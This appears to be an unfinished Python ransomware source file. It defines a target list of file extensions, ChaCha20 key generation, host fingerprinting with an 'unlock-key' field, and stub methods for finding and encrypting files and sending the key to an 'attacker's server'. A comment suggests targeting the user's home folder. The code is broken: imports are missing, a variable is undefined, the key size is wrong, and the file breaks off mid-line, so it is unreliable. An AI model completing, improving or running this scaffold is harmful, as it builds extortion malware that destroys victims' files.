import argparse
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes

class Ransomware:

    #  Handler
    def __init__(self):
        self.key = None
        self.cipher = None
        self.file_ext =  [
            # System files
            'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img'  

            # Media files
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  
            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  

            # Document files
            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',

            # Config files
            'yml', 'yaml', 'json', 'xml', 'csv',

            # Database files
            'db', 'sql', 'dbf', 'mdb', 'iso',

            # Source-code files
            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
            'java', 'class', 'jar',
            'ps', 'bat', 'vb',
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
            'go', 'py', 'pyc', 'bf', 'coffee',

            # Backup files
            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        ]

    # Create encryption key
    def generate_key(self):
        self.key = get_random_bytes(256)
        self.cipher = ChaCha20.new(key=self.key)

    # Read key for decryption
    def read_key(self):
        pass

    # Get OS information
    def sys_info(self):
        self.info = {}
        self.info['platform'] = platform.system()
        self.info['platform-release'] = platform.release()
        self.info['platform-version'] = platform.version()
        self.info['architecture'] = platform.machine()
        self.info['hostname'] = socket.gethostname()
        self.info['ip-address'] = socket.gethostbyname(socket.gethostname())
        self.info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.info['processor'] = platform.processor()
        self.info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        self.info['infection-date'] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        self.info['unlock-key'] = str(key).split("'")[1]

    # Send key to attacker's server
    def send(self):
        pass

    # Search files for encryption
    def search_files(self):
        pass

    # Encrypt files 
    def encrypt(self):
        pass

if __name__ == '__main__':

    # root = expanduser('~')    # Encrypt user's home folder
    test = "./testing"          # Encrypt demo folder

    parser = argparse.ArgumentParser()
    parser.add_argument('-k', '--key')
    args = parser.parse_args()
    
    ransom = Ransomware()

    if key:
        ransom.read_key(args.key)
        ransom.search_files(test, encrypted=True)
    else:
        ransom.generate_key()
        ransom.encrypt_